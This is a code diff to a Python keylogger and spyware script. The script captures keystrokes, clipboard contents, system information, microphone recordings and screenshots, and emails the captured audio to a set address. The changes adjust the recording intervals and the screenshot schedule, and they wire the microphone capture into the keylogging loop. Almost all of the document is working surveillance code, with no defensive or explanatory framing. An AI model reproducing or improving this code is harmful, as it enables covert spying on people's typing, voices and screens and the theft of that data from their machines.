@@ -22,9 +22,8 @@ import win32clipboard
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
-microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 3
+time_interval = 20
+number_of_screenshots = 3
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 print("System initialize" + str(time.time()))
@@ -100,8 +99,7 @@ def copy_clipboard():
 # Microphone
 def microphone():
     fs = 44100
-    seconds = microphone_time
-    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    myrecording = sd.rec(int(time_interval * fs), samplerate=fs, channels=2)
     sd.wait()
     write(file_path + extend + audio_information, fs, myrecording)
 
@@ -111,6 +109,8 @@ def screenshot():
     im.save(file_path + extend + screenshot_information)
 
 # Keylogger Functions
+keys = []
+count = 0
 def on_press(key):
     global keys, count, currentTime
     keys.append(key)
@@ -140,14 +140,15 @@ def on_release(key):
 # Timer for Keylogger
 number_of_iterations = 0
 currentTime = time.time()
-stoppingTime = time.time() + time_iteration
+screenshot_time = time_interval / number_of_screenshots
+stoppingTime = time.time() + time_interval
 
-while number_of_iterations < number_of_iterations_end:
-    count = 0
-    keys = []
+while number_of_iterations < number_of_screenshots:
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+        
+    microphone()
 
     if currentTime > stoppingTime:
         with open(file_path + extend + keys_information, "w") as f:
@@ -158,7 +159,7 @@ while number_of_iterations < number_of_iterations_end:
 
         number_of_iterations += 1
         currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
+        stoppingTime = time.time() + screenshot_time
 
 #time.sleep(30)
 send_email(audio_information, file_path + extend + audio_information, toaddr)
